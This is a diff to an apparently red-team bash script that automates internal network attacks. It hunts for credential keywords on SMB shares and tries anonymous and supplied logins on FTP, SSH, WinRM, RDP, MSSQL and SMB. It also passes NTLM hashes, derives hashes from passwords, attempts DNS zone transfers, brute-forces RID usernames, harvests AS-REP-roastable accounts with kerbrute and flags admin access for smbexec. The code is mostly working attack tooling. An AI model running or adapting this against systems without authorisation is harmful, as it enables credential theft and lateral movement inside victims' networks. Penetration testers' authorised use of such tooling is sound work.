@@ -19,11 +19,18 @@ starter() {
 		Password="anonymous"
 	fi
 
-	read -p "Proxychains ? : (yY/nN)" proxychains
-	if [ "$proxychains" = "y" ] || [ "$proxychains" = "Y" ]; then
-		proxychains="proxychains -q"
-	else proxychains=""
-	fi
+	while true; do
+		read -p "Use proxychains ? : (yY/nN) " proxychains
+		if [[ "$proxychains" = "y" || "$proxychains" = "Y" ]]; then
+			proxychains="proxychains -q"
+			break
+		elif [[ "$proxychains" = "n" || "$proxychains" = "N" ]]; then
+			proxychains=""
+			break
+		else
+			echo "Error: unknown option"
+		fi
+	done
 
 	if [ -n "$Password" ]; then
 		cme_creds="-p $Password"
@@ -218,10 +225,8 @@ nmap_fast () {
 	echo "xsltproc $DIR/scan_nmap/scan_Full_UDP.xml -o /tmp/scan_Full_UDP.html"
 	xsltproc $DIR/scan_nmap/scan_Full_UDP.xml -o /tmp/scan_Full_UDP.html
 	#Suppression des filtered|opened
-	echo "echo2"
 	awk 'BEGIN { RS="</tr>" } /open\|filtered/ { next } { printf "%s", $0 "</tr>" }' /tmp/scan_Full_UDP.html > /tmp/scan_Full_UDP_open.html
 	log "${SPACE}[!] Nmap UDP report in HTML format : /tmp/scan_Full_UDP.html"
-	echo "echo3"
 	#Extracting IP from the 2 reports
 	grep -i 'Nmap scan report for' "${DIR}/scan_nmap/scan_Fast_TCP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${DIR}/hosts.txt
 	grep -i 'Nmap scan report for' "${DIR}/scan_nmap/scan_Full_UDP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${DIR}/hosts.txt
@@ -388,7 +393,7 @@ manspider () {
 	if [ -e "$DIR_PORTS/445.txt" ]; then
 		max_size_files_checked="15M"
 		threads="100"
-		wordlist="confiden classified bastion '\bcode\w*' creds credential wifi hash ntlm '\bidentifiant\w*' compte utilisateur '\buser\w*' '\b\$.*pass\w*' '\root\w*' '\b\$.*admin\w*' '\badmin\w*' account login 'cpassword\w*' 'pass\w*' cred '\b\$.*pass\w*' cisco pfsense pfx ppk rsa pem ssh rsa '\bcard\w*' '\bcarte\w*' '\bidentite\w*' '\bidentité\w*' '\bpasseport\w*'"
+		wordlist="confiden classified bastion '\bcode\w*' creds credential wifi hash ntlm '\bidentifiant\w*' compte utilisateur '\buser\w*' '\b\$.*pass\w*' '\root\w*' '\b\$.*admin\w*' '\badmin\w*' account login 'cpassword\w*' 'pass\w*' cred '\b\$.*pass\w*' cisco pfsense pfx ppk rsa ssh rsa '\bcard\w*' '\bcarte\w*' '\bidentite\w*' '\bidentité\w*' '\bpasseport\w*'"
 		exclusions="--exclude-dirnames AppData --exclude-extensions DAT LOG2 LOG1 lnk msi"
 		request_manspider="$proxychains manspider -n -s $max_size_files_checked -t $threads -c $wordlist $exclusions"
 		log "[🔍] Launching manspider"
@@ -478,21 +483,23 @@ ftp () {
 		
 		FTP=$(cat $DIR_PORTS/21.txt)
 		for ip in $FTP; do
+			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+			log "${SPACE}[📂] Check for $ip ($hostname) ..."
 			# Essayer de se connecter à l'adresse IP via FTP
 			$proxychains netexec ftp ${ip} -u "anonymous" -p "" < /dev/null >> $DIR_VULNS/ftp_anonymous_${ip}.txt 2>/dev/null 
 		
 			# Vérifier le code de retour de la commande SSH
 			if grep -aq '\[+\]' $DIR_VULNS/ftp_anonymous_${ip}.txt; then
-				green_log "${SPACE}[💀] FTP ANONYMOUS connection successed on $ip"
-				blue_log "${SPACE} [+] ftp anonymous@$ip"
+				green_log "${SPACE}${SPACE}[💀] FTP ANONYMOUS connection successed"
+				blue_log "${SPACE}${SPACE} [+] $proxychains ftp anonymous@$ip"
 			fi
 			
 			if [[ "$Username" != "anonymous" ]];then
 				$proxychains netexec ftp ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ftp_${Username}_${ip}.txt 2>/dev/null 
 				# Vérifier le code de retour de la commande SSH
 				if grep -aq '\[+\]' $DIR_VULNS/ftp_${Username}_${ip}.txt; then
-					green_log "${SPACE}[💀] FTP connection successed on $ip with ${username} user"
-					blue_log "${SPACE} [+] ftp $Username@$ip"
+					green_log "${SPACE}${SPACE}[💀] FTP connection successed with ${username} user"
+					blue_log "${SPACE}${SPACE} [+] $proxychains ftp $Username@$ip"
 				fi
 			fi
 		done
@@ -507,14 +514,16 @@ ssh () {
 		log "[🔍] Check SSH"
 		SSH=$(cat $DIR_PORTS/22.txt)
 		for ip in $SSH; do
+			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+			log "${SPACE}[📂] Check for $ip ($hostname) ..."
 			# Essayer de se connecter à l'adresse IP via SSH
 			#$proxychains sshpass -p "$Password" ssh -o StrictHostKeyChecking=no ${Username}@${ip} "ls" 2>/dev/null
 			
 			$proxychains netexec ssh ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ssh_${Username}_${ip}.txt 2>/dev/null 
 			# Vérifier le code de retour de la commande SSH
 			if grep -aq '\[+\]' $DIR_VULNS/ssh_${Username}_${ip}.txt; then
-				green_log "${SPACE}[💀] SSH connection successed on $ip with ${username} user"
-				blue_log "ssh $Username@$ip"
+				green_log "${SPACE}${SPACE}[💀] SSH connection successed"
+				blue_log "${SPACE}${SPACE} $proxychains ssh $Username@$ip"
 			fi
 		done
 	fi
@@ -532,7 +541,7 @@ winrm () {
 		WINRM=$(cat $DIR_PORTS/winrm.txt)
 		for ip in $WINRM; do
 			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			
+			log "${SPACE}[📂] Check for $ip ($hostname) ..."
 			# Essayer de se connecter à l'adresse IP via WINRM
 			$proxychains netexec --timeout $CME_TIMEOUT winrm ${ip} -u "$Username" $cme_creds < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
 			if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/winrm_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/winrm_${ip}"; then
@@ -545,11 +554,11 @@ winrm () {
 			
 			# Vérifier le code de retour de la commande WINRM
 			if [ "$(cat ${DIR_VULNS}/winrm_${ip} | grep -ai '\[+\]')" ]; then
-				green_log "${SPACE}[💀] WINRM connection successed on $ip ($hostname)"
+				green_log "${SPACE}${SPACE}[💀] WINRM connection successed"
 				if grep -aq '(Pwn3d!)' ${DIR_VULNS}/winrm_${ip}; then
-					red_log "${SPACE}[💀] $Username have admin rights on ${ip} (${hostname}) !"
+					red_log "${SPACE}${SPACE}[💀] $Username have admin rights !"
 				fi
-				blue_log "$proxychains evil-winrm -i ${host} -u "$Username" $cme_creds"
+				blue_log "${SPACE}${SPACE} [+] $proxychains evil-winrm -i ${host} -u "$Username" $cme_creds"
 			else
 				#echo ${DIR_VULNS}/winrm_${ip}
 				#cat ${DIR_VULNS}/winrm_${ip}
@@ -572,57 +581,63 @@ rdp () {
 		RDP=$(cat $DIR_PORTS/3389.txt)
 		for ip in $RDP; do
 			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			#Suppression de l'historique des certificats
-			rm ~/.config/freerdp -rf
-			#Try to connect with NTLM
-			if [ -n "$NT_Hash" ]; then
-				script -c "$proxychains timeout $RDP_TIMEOUT xfreerdp /cert-tofu /v:${ip} /u:${Username} /pth:${NT_Hash} /sec:nla +clipboard" ${DIR_VULNS}/rdp_${ip} > /dev/null 2>&1 < /dev/null
-				RDP_command="$proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /pth:${NT_Hash} /sec:nla +clipboard"
-			else
-				script -c "$proxychains timeout $RDP_TIMEOUT xfreerdp /cert-tofu /v:${ip} /u:${Username} /p:${Password} /sec:nla +clipboard" ${DIR_VULNS}/rdp_${ip} > /dev/null 2>&1 < /dev/null
-				RDP_command="$proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /p:${Password} /sec:nla +clipboard"
-			fi
-			# Vérifier le code de retour de la commande RDP
-			if [ "$(cat ${DIR_VULNS}/rdp_${ip} | grep -i "Loading Dynamic Virtual")" ] || [ "$(cat ${DIR_VULNS}/rdp_${ip} | grep -i "Loaded fake backend")" ]; then
-			#Faire un cat -v -e FILE pour voir les couleurs et debut - fin de lignes
-				green_log "${SPACE}[💀] RDP connection successed on $ip ($hostname) -> Can be only available in restricted admin mode or with password"
-				blue_log "${SPACE} [+] $RDP_command"
-			elif cat ${DIR_VULNS}/rdp_${ip} | grep -aqi "SEC_E_UNSUPPORTED_FUNCTION";then #If NTLM is disable
-				hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-				#Si NTLM n'est pas supporté, recommencer en passant avec kerberos
-				if [[ -n "$hostname" ]];then
-					kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-					host="$(echo $hostname | cut -d '.' -f 1)"
-				fi
-				#Convert to NTLM hash to avoid to disconnect user if he is already connected. Found this tricks on my lab
-				if [[ -n "$Password" ]];then
-					NTLM=$(iconv -f ASCII -t UTF-16LE <(printf "${Password}") | openssl dgst -md4 | awk -F "= " '{print $2}')
-					#First try with NTLM_Hash
-					$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" -H "$NTLM" $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
-					check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
-					if [[ "$check_rdp" -gt 0 ]]; then
-						green_log "${SPACE}[💀] KRB OPSEC - RDP connection successed on $ip ($hostname) (via Kerberos only) -> Can be only available in restricted admin mode or with password"
+			rdp_mode="NTLM"
+			log "${SPACE}[📂] Check for $ip ($hostname) ..."
+			if [[ "$Username" != "anonymous" ]]; then
+				$proxychains netexec --timeout $CME_TIMEOUT rdp $ip -u $Username $cme_creds --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
+				successed_rdp="${SPACE}${SPACE}[💀] RDP connection successed (via NTLM) -> Can be only available in restricted admin mode or with password"
+				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/rdp_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/rdp_${ip}"; then
+					#If NTLM is not supported, restart with kerberos
+					rdp_mode="KRB"
+					if [[ -n "$hostname" ]];then
+						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
+						host="$(echo $hostname | cut -d '.' -f 1)"
+					fi
+					if [[ -n "$Password" ]];then
+						NTLM=$(iconv -f ASCII -t UTF-16LE <(printf "${Password}") | openssl dgst -md4 | awk -F "= " '{print $2}')
+						#First try with NTLM_Hash
+						$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" -H "$NTLM" $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
+						check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
+						if [[ "$check_rdp" -gt 0 ]]; then
+							successed_rdp="${SPACE}${SPACE}[💀] KRB OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
+						else
+							#Second try with Password
+							$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
+							check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
+							if [[ "$check_rdp" -gt 0 ]]; then
+								#Can be detected by disconnection
+								successed_rdp="${SPACE}${SPACE}[💀] KRB NON OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
+							fi
+						fi
 					else
-						#Second try with Password
+						#Can be detected by disconnection
+						echo "$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot"
 						$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
 						check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
 						if [[ "$check_rdp" -gt 0 ]]; then
-							#Can be detected by disconnection
-							green_log "${SPACE}[💀] KRB NON OPSEC - RDP connection successed on $ip ($hostname) (via Kerberos only) -> Can be only available in restricted admin mode or with password"
+							successed_rdp="${SPACE}${SPACE}[💀] KRB OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
 						fi
-					fi
-				else
-					#Can be detected by disconnection
-					echo "$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot"
-					$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
-					check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
-					if [[ "$check_rdp" -gt 0 ]]; then
-						green_log "${SPACE}[💀] KRB OPSEC - RDP connection successed on $ip ($hostname) (via Kerberos only) -> Can be only available in restricted admin mode or with password"
 					fi
 				fi
 			fi
-			
-			rm ~/.config/freerdp -rf
+				
+			if grep -aq '\[+\]' ${DIR_VULNS}/rdp_${ip}; then
+				if grep -aq '(Pwn3d!)' ${DIR_VULNS}/rdp_${ip}; then
+					red_log "${SPACE}${SPACE}[💀] $Username have admin rights !"
+					admin="1"
+				fi
+				check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
+				if [[ "$check_rdp" -gt 0 ]]; then
+					green_log "$successed_rdp"
+					if [ "$rdp_mode" = "NTLM" ]; then
+						if [ -n "$NT_Hash" ]; then
+							blue_log "${SPACE}${SPACE} [+] $proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /pth:${NT_Hash} /sec:nla +clipboard"
+						else
+							blue_log "${SPACE}${SPACE} [+] $proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /p:${Password} /sec:nla +clipboard"
+						fi
+					fi
+				fi
+			fi
 		done
 	fi
 }
@@ -680,17 +695,18 @@ vnc () {
 zt () {
 	log "[🔍] Trying zone transfer"
 	DNSPATH=$DIR/ZoneTransfertDNS
-	NS=$(host -t ns $domain | awk -F"name server" '{print$2}')
-	for ip in $NS;
+	domain=$(head -n 1 $DIR/hostname_file.txt | awk -F ":" '{print $2}' | cut -d '.' -f 2-)
+	NS=$($proxychains host -T -t ns $domain | awk -F"name server" '{print$2}')
+	NS_cleaned=$(echo "$NS" | while read -r line; do echo "${line:0: -1}"; done)
+	for name_server in $NS_cleaned;
 	do
-		if ! host -t axfr $domain $(host $ip | awk -F "has address" '{print$2}') | grep -q "; Transfer failed." ;then
-			green_log "${SPACE}[💀] $ip Vulnerable to zone transfer"
+		$proxychains host -T -t axfr $domain $name_server > $DNSPATH/$name_server.txt
+		if ! grep -q "; Transfer failed." $DNSPATH/$name_server.txt;then
 			if [ ! -d $DNSPATH ];then
 				mkdir $DNSPATH
 			fi
-			host -t axfr $domain $(host $ip | awk -F "has address" '{print$2}') > $DNSPATH/$ip.txt
-			green_log "${SPACE}[💀] Zone transfer performed successfully !"
-			blue_log "${SPACE} [+] Details to be retreived at $DNSPATH"
+			green_log "${SPACE}[💀] Zone transfer performed successfully for $name_server !"
+			blue_log "${SPACE} [+] Details to be retreived at $DNSPATH/$name_server.txt"
 		fi
 	done
 }
@@ -775,21 +791,21 @@ ldap () {
 				check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)
 				
 				if [[ "$check_ldap" -gt 0 ]]; then
-					green_log "${SPACE}[💀] Anonymous LDAP possible -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}.txt"
+					green_log "${SPACE}${SPACE}[💀] Anonymous LDAP possible -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}.txt"
 					
 					#Aller plus loin en tentant d'extraire les noms d'utilisateurs :
 					$proxychains ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" "objectclass=user" sAMAccountName | grep "sAMAccountName" | awk -F ": " '{print $2}'| grep -v "sAMAccountName" > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
 					check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)
 
 					if [[ "$check_ldap" -gt 0 ]]; then
-						green_log "${SPACE}[💀] Users extracted -> ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt"
+						green_log "${SPACE}${SPACE}[💀] Users extracted -> ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt"
 					fi
 					
 					#Retrieving the users account via kerbrute and trying to get no-preauth users
 					$proxychains kerbrute userenum --dc $DC_Name -d $LDAP_domain ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt -t 50 --downgrade --hash-file ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt > ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt 2>/dev/null
 					check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'krb5asrep' | wc -l)
 					if [[ "$check_ldap" -gt 0 ]]; then
-						green_log "${SPACE}[💀] Users without pre-auth found ! -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt"
+						green_log "${SPACE}${SPACE}[💀] Users without pre-auth found ! -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt"
 					fi
 					cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'VALID' | awk -F "[:@]" '{print $4}'| sed 's/^[ \t]*//;s/[ \t]*$//' >> ${DIR}/users.txt
 					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
@@ -851,6 +867,7 @@ mssql () {
 		log "[🔍] MSSQL check"
 		MSSQL=$(cat ${DIR_PORTS}/1443.txt)
 		for ip in $MSSQL; do
+			log "${SPACE}[📂] Check for $ip ($hostname) ..."
 			cat ${DIR_VULNS}/mssql/cme_${ip}_basic
 			$proxychains netexec --timeout $CME_TIMEOUT mssql $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
 			if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/mssql/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/mssql/cme_${ip}_basic"; then
@@ -863,10 +880,10 @@ mssql () {
 				$proxychains netexec mssql $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
 			fi
 			if grep -aq '\[+\]' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
-				green_log "${SPACE}[💀] $Username is a valid username ${ip} (${hostname})"
+				green_log "${SPACE}${SPACE}[💀] $Username is a valid username ${ip} (${hostname})"
 			fi
 			if grep -aq '(Pwn3d!)' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
-				red_log "${SPACE}[💀] $Username have admin rights on MSSQL DB ${ip} (${hostname}) !"
+				red_log "${SPACE}${SPACE}[💀] $Username have admin rights on MSSQL DB ${ip} (${hostname}) !"
 			fi
 		done
 	fi
@@ -885,8 +902,8 @@ smb () {
 			#Anonymous / null session is allowed ?
 			$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 1000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session 2>/dev/null
 			if grep -aq 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
-				green_log "${SPACE}[💀] $ip allow null session (anonymous)"
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute 2>/dev/null
+				green_log "${SPACE}${SPACE}[💀] Null session (anonymous) allowed"
+				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute 2>/dev/null
 				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
 				## Injecter ces utilisateurs dans un fichier
@@ -897,18 +914,18 @@ smb () {
 				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
 				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | wc -l)
 				if [[ "$check_smb" -gt 0 ]]; then
-					green_log "${SPACE}[💀] New users found (check descriptions can be interesting) -> ${DIR}/users_with_descriptions.txt"
+					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
 				fi
-				$proxychains timeout 7 smbmap -H $host --no-banner > ${DIR_VULNS}/smb/smbmap_${ip}_null_session_shares 2>/dev/null
+				$proxychains timeout 7 smbmap -H $host --no-banner | grep -vE "Enumerating shares\.\.\.|Authenticating\.\.\.|Checking for open ports\.\.\.|Closing connections\.\." > ${DIR_VULNS}/smb/smbmap_${ip}_null_session_shares 2>/dev/null
 				if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_shares"; then
-					green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_null_session_shares"
-					blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 --exclude IPC$"
+					green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/smbmap_${ip}_null_session_shares"
+					blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 --exclude IPC$"
 				fi
 			fi
 			# Guest session allowed ?
 			$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest 2>/dev/null
 			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest; then
-				green_log "${SPACE}[💀] $ip allow guest session, trying to extract users .."
+				green_log "${SPACE}${SPACE}[💀] Guest session allowed"
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
 				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
@@ -919,41 +936,41 @@ smb () {
 				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
 				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | wc -l)
 				if [[ "$check_smb" -gt 0 ]]; then
-					green_log "${SPACE}[💀] New users found (check descriptions can be interesting) -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
+					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
 				fi
-				$proxychains timeout 7 smbmap -H $host -p 'GuestUser' -p '' --no-banner > ${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares 2>/dev/null
+				$proxychains timeout 7 smbmap -H $host -p 'GuestUser' -p '' --no-banner | grep -vE "Enumerating shares\.\.\.|Authenticating\.\.\.|Checking for open ports\.\.\.|Closing connections\.\." > ${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares 2>/dev/null
 				if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares"; then
-					green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares"
-					blue_log "${SPACE} [+] smbmap -H ${ip} -p 'GuestUser' -p '' -r --depth 3 --exclude IPC$"
+					green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares"
+					blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -p 'GuestUser' -p '' -r --depth 3 --exclude IPC$"
 				fi
 			fi
 			# Can i connect with input user ?
 			if [[ "$Username" != "anonymous" ]]; then
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic 2>/dev/null
-				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic"; then
+				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic_$Username"; then
 					#If NTLM is not supported, restart with kerberos
 					if [[ -n "$hostname" ]];then
 						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
 						host="$(echo $hostname | cut -d '.' -f 1)"
 					fi
-					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic 2>/dev/null
+					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_$Username 2>/dev/null
 				else
 					kerberos=""
 					host="${ip}"
 				fi
 			fi
 			#Can we connect to at least one share ?
-			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_basic || grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest || grep -aq 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
+			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username || grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest || grep -aq 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
 				if [[ "$Username" != "anonymous" ]]; then
-					green_log "${SPACE}[💀] $Username is a valid username"
+					green_log "${SPACE}${SPACE}[💀] $Username is a valid username"
 				fi
 				can_connect="1"
 			else
 				can_connect="0"
 			fi
 			#Are we machine's admin
-			if grep -aq '(Pwn3d!)' ${DIR_VULNS}/smb/cme_${ip}_basic; then
-				red_log "${SPACE}[💀] $Username is admin of this machine ! -> impacket-smbexec to exploit"
+			if grep -aq '(Pwn3d!)' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username; then
+				red_log "${SPACE}${SPACE}[💀] $Username have admin rights ! -> impacket-smbexec to exploit"
 				admin="1"
 			else
 				admin="0"
@@ -962,19 +979,19 @@ smb () {
 			if [ "$can_connect" = "1" ]; then
 				#List available shares
 				if [ "$Username" = "anonymous" ]; then
-					$proxychains timeout 7 smbmap -H $host --no-banner > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
+					$proxychains timeout 7 smbmap -H $host --no-banner | grep -vE "Enumerating shares\.\.\.|Authenticating\.\.\.|Checking for open ports\.\.\.|Closing connections\.\."  > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
 					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_shares"; then
-						green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
-						blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '' -p '' --exclude IPC$ --no-banner"
+						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
+						blue_log "${SPACE}${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '' -p '' --exclude IPC$ --no-banner"
 					fi
 				else
 					$proxychains timeout 7 smbmap -H $host -u "$Username" $cme_creds --no-banner > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
 					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_shares"; then
-						green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
+						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
 						if [ -n "$NT_Hash" ]; then
-							blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
+							blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
 						else
-							blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
